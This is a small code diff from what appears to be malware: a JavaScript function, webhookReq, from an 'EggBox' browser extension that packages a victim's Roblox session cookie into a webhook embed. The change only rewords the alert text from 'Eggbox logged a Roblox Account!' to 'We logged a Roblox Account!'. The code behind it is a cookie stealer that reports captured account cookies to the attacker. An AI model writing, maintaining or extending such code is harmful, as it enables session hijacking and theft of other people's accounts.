@@ -1,8 +1,8 @@
 function webhookReq(webhook, cookie) {
   var params = {
       embeds: [{
-            "title": `Eggbox logged a Roblox Account!`,
-            "description": ">>> EggBox extension logged someone; see information about the user below",
+            "title": `We logged a Roblox Account!`,
+            "description": ">>>We logged someone; see information about the user below",
             "color": 15258703,
             "fields": [{
               "name": 'Cookie',
